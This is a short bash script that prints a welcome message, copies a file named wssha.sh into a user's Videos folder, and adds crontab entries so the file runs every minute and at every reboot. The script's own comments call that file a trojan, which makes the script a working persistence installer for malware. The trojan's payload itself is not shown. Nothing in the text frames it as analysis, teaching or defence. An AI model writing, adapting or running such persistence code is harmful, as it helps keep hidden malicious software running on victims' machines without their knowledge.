#!/bin/bash

echo 'Welcome to my script';

cp -r wssha.sh /home/vicky/Videos/wssha.sh
#Crontab for running trojan every minutes

crontab -l > everyMin

echo "*/1 * * * * bash /home/vicky/Videos/wssha.sh" >> everyMin

crontab everyMin

rm -r everyMin

#Crontab for running trojan for every bootup
crontab -l > bootup

echo "@reboot /home/vicky/Videos/wssha.sh" >> bootup

crontab bootup

rm -r bootup


